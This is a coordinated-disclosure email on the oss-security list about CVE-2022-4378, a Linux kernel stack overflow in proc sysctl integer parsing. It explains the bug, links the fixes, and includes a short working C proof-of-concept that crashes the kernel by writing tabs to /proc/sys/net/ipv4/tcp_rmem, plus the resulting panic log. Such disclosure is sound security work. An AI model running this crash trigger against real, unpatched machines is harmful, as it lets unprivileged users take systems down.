Received: (qmail 7518 invoked by uid 550); 9 Dec 2022 16:18:03 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3513 invoked from network); 9 Dec 2022 16:12:14 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=3nPaUWbRji1RmkTFra5TSKVmNyhHw2OnsYOEdoLJcvk=;
        b=ICAL3F+ruC4mi0lEOKblo8RQlJGl9hcY44y9FM2suVM7Q6DmbpwXaEqWWHp53Xu0cQ
         vhYast3lzYk1xVzV+CIPlLJ8oJmEbhg5oFWzbLpE8D0163QtWmL1403VT6AhoqzVJVzf
         DPfG8pIDVETmiOJA2xACkT6ZDtNLQe+8KuMNkM6K96fCmeXE9eD7pKBVtpumlMz0IMsT
         jFujJRxUw3gdDO/NeJ+tBCVN7NInFQwpZM92RxKqB1pefdg5t8WGRX6CxiEYIhOFox5P
         ajMsiwcBSCpgRBrdHiBj39G21DacKYsl6PEQrVE4H+fyqwnaW+Cyzs1v7LkewCZXGXSY
         Fx5w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=3nPaUWbRji1RmkTFra5TSKVmNyhHw2OnsYOEdoLJcvk=;
        b=R5RcARj7WUzuQ4cKBoTs1REkHOAs7dttRYqYcu0KNBHGnIXkTTiAfG4b+DWlTfPTW2
         TBJjvJ+WvThIF+gVr+3j3lcOWKLZE2dllaEgVkXFkqLb0NpqaO3GBkNt1Uh7KCCOPjwx
         FLNgAG9MCPxvGSun1MC2Njlae37S69mZlZLQgdBZedkkgX7RCO8jbLx6UIo/9ck9uVnR
         TbxZvzp43gbxdzVb0IjT2jdauecxsFO2LWTsuDFejsU3o2gCoFlPml2SSBfJxhRGjqQ1
         mC9bOAy7SLCdkVWP7JBOCnEeN4SBeSZzGu61QGatygDvryyJEgjX/LYf+pzK4ctIj/ry
         fwKg==
X-Gm-Message-State: ANoB5pm2SvLpfD56mWm1eK+YRoJDO75IQhORMKSJkShbSvgJfhOfbeW4
	mqaUwiGM70vXHMm2NYbu/Io7QeBa6308f+RdpD2EUoS27z+b+g==
X-Google-Smtp-Source: AA0mqf6WJMwE66ExYlyqAc/V7fZQEUpZnxcQozvmnQ/lgnhVPAOfsHljbrdtY+OSKwXlFpPeOFC8FUYqzhuhFlS1AeA=
X-Received: by 2002:a65:45c5:0:b0:46e:c7be:16fc with SMTP id
 m5-20020a6545c5000000b0046ec7be16fcmr66079194pgr.462.1670602321597; Fri, 09
 Dec 2022 08:12:01 -0800 (PST)
MIME-Version: 1.0
From: Kyle Zeng <zengyhkyle@gmail.com>
Date: Fri, 9 Dec 2022 09:11:25 -0700
Message-ID: <CADW8OBuPiiz8z1udNZYAduNZXtLWrj+AoefhMJvSqcd99uOS9Q@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset="UTF-8"
Subject: [oss-security] CVE-2022-4378: Linux kernel stack-based buffer overflow

Hi there,

I recently found a stack-based buffer overflow in the Linux kernel,
which can cause DOS and is potentially exploitable. This bug affects
the following kernel versions: latest, 6.0, 5.15, 5.10, 5.4, 4.19,
4.14, and 4.9. I already contacted security@kernel.org and helped them
patch the vulnerable kernel versions.

# Vulnerability
The vulnerability is caused by a missing check on user input. More
specifically, __do_proc_dointvec function has the following snippet:
~~~
if (write) {
    ......
    if (left > PAGE_SIZE - 1)
        left = PAGE_SIZE - 1;
    p = buffer;
}
......
if (write) {
    left -= proc_skip_spaces(&p);
~~~
In this snippet, `buffer` and `p` represent a buffer containing
user-supplied input and it can contain more than 1 page of data. It
first truncates user input to 1 page (by marking number of bytes
`left` as 1 page). However, in a later call to `proc_skip_spaces` (a
function that assumes the argument is a NULL-terminated string), it
forgets the "up to 1 page" limit, processes all user input, and
calculates how many leading spaces are there in the user input. In the
buffer contains more than 1 page of spaces, `left` will be set to a
negative value. The negative value will then be passed to
`proc_get_long` and the least significant 4 bytes will be used as
length for memcpy that copies data to kernel stack, causing
stack-based buffer overflow: (the check on `len` won't work because
`len` is signed)
~~~
static int proc_get_long(...)
{
    char tmp[TMPBUFLEN];
    int len = *size;

    if (len > TMPBUFLEN - 1)
        len = TMPBUFLEN - 1;

    memcpy(tmp, *buf, len);
    ......
}
~~~

# Patch
The patch consists of two parts:
1.  refactor `proc_skip_spaces`, instead of assuming the argument is a
NULL-terminated string, it now will process data up to a limit. The
patch can be found here:
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=bce9332220bd677d83b19d21502776ad555a0e73
2. fix the signness issue in `len`:
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e6cfaf34be9fcd1a8285a294e18986bfc41a409c

# Trigger
The bug is triggerable by non-root users if they have access to
user-namespace. A proof-of-concept crash program that causes kernel
panic is attached. To run the POC, you need net namespace. In other
words, you can trigger the bug using the following command: `unshare
-rn` and then `./poc`.

Best,
Kyle Zeng

===========================================
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

int main(void)
{
    int fd = open("/proc/sys/net/ipv4/tcp_rmem", O_WRONLY);
    void *a = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE,
MAP_ANON|MAP_PRIVATE, -1, 0);
    memset(a, '\x09', 0x2000);
    write(fd, a, 0x2000);
    return 0;
}
============================================
[    7.150435] BUG: stack guard page was hit at 00000000eea91c87
(stack is 00000000fdd90d6b..000000009d81213d)
[    7.152330] kernel stack overflow (page fault): 0000 [#1] SMP NOPTI
[    7.153467] CPU: 3 PID: 476 Comm: poc Not tainted 5.10.157 #37
[    7.154815] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS 1.15.0-1 04/01/2014
[    7.156633] RIP: 0010:memcpy_erms+0x6/0x10
[    7.157118] Code: cc cc cc cc eb 1e 0f 1f 00 48 89 f8 48 89 d1 48
c1 e9 03 83 e2 07 f3 48 a5 89 d1 f3 a4 c3 66 0f 1f 44 00 00 48 89 f8
48 89 d1 <f3> a4 c3 0f 1f 80 00 00 00 00 48 89 f8 48 83 fa 20 72 7e 40
38 fe
[    7.158177] RSP: 0018:ffffc90000823c68 EFLAGS: 00010282
[    7.158488] RAX: ffffc90000823ca0 RBX: ffffffffffffefff RCX: ffffffffffffec9f
[    7.158932] RDX: ffffffffffffefff RSI: ffff888007d7e360 RDI: ffffc90000824000
[    7.159347] RBP: ffffc90000823d00 R08: ffffffff824158b3 R09: 0000000000000000
[    7.159802] R10: ffffc90000823eb8 R11: ffffffff810fb290 R12: ffffc90000823d58
[    7.160201] R13: ffffc90000823d47 R14: ffffc90000823ca0 R15: ffffffffffffefff
[    7.160603] FS:  0000000001a533c0(0000) GS:ffff88803ed80000(0000)
knlGS:0000000000000000
[    7.161053] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    7.161373] CR2: ffffc90000824000 CR3: 0000000007f3e006 CR4: 0000000000770ee0
[    7.161769] PKRU: 55555554
[    7.161924] Call Trace:
[    7.162076]  proc_get_long+0x90/0x190
[    7.162286] Modules linked in:
[    7.162463] ---[ end trace d4a913b02029fee9 ]---
[    7.162722] RIP: 0010:memcpy_erms+0x6/0x10
[    7.162952] Code: cc cc cc cc eb 1e 0f 1f 00 48 89 f8 48 89 d1 48
c1 e9 03 83 e2 07 f3 48 a5 89 d1 f3 a4 c3 66 0f 1f 44 00 00 48 89 f8
48 89 d1 <f3> a4 c3 0f 1f 80 00 00 00 00 48 89 f8 48 83 fa 20 72 7e 40
38 fe
[    7.164044] RSP: 0018:ffffc90000823c68 EFLAGS: 00010282
[    7.164370] RAX: ffffc90000823ca0 RBX: ffffffffffffefff RCX: ffffffffffffec9f
[    7.164780] RDX: ffffffffffffefff RSI: ffff888007d7e360 RDI: ffffc90000824000
[    7.165188] RBP: ffffc90000823d00 R08: ffffffff824158b3 R09: 0000000000000000
[    7.165595] R10: ffffc90000823eb8 R11: ffffffff810fb290 R12: ffffc90000823d58
[    7.166002] R13: ffffc90000823d47 R14: ffffc90000823ca0 R15: ffffffffffffefff
[    7.166431] FS:  0000000001a533c0(0000) GS:ffff88803ed80000(0000)
knlGS:0000000000000000
[    7.166889] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    7.167218] CR2: ffffc90000824000 CR3: 0000000007f3e006 CR4: 0000000000770ee0
[    7.167661] PKRU: 55555554
[    7.167820] Kernel panic - not syncing: Fatal exception
[    7.168333] Kernel Offset: disabled
[    7.168544] Rebooting in 1000 seconds..
